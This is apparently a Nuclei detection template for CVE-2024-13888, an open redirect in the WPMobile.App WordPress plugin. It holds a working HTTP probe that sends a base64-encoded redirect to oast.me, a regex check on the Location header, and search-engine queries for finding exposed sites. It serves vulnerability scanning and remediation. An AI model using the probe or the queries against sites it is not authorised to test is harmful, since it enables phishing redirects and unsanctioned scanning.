flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - contains(body, "wpappninja")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: header
    regex:
    - (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)oast\.me\/?(\/|[^.].*)?$
    type: regex
  raw:
  - 'GET /?redirect=aHR0cDovL29hc3QubWU=&WPMOBILE_LOCALE=en HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-13888
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-13888
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-601
    epss-percentile: 0.72274
    epss-score: 0.00739
  description: 'The WPMobile.App plugin for WordPress is vulnerable to Open Redirect
    in all versions up to, and including, 11.56. This is due to insufficient validation
    on the redirect URL supplied via the ''redirect'' parameter. This makes it possible
    for unauthenticated attackers to redirect users to potentially malicious sites
    if they can successfully trick them into performing an action.

    '
  impact: 'Unauthenticated attackers can redirect users to malicious phishing sites
    or credential harvesting pages via the redirect parameter.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/wpappninja"
    framework: wordpress
    max-request: 2
    product: wpappninja
    publicwww-query: /wp-content/plugins/wpappninja
    vendor: amauri
    verified: true
  name: WPMobile.App <= 11.56 - Open Redirect
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpappninja/wpmobileapp-1156-open-redirect-via-redirect-parameter
  - https://nvd.nist.gov/vuln/detail/CVE-2024-13888
  remediation: 'Update WPMobile.App plugin to a version newer than 11.56.

    '
  severity: high
  tags: cve,cve2024,redirect,wp,wordpress,wp-plugin,wpappninja,vuln
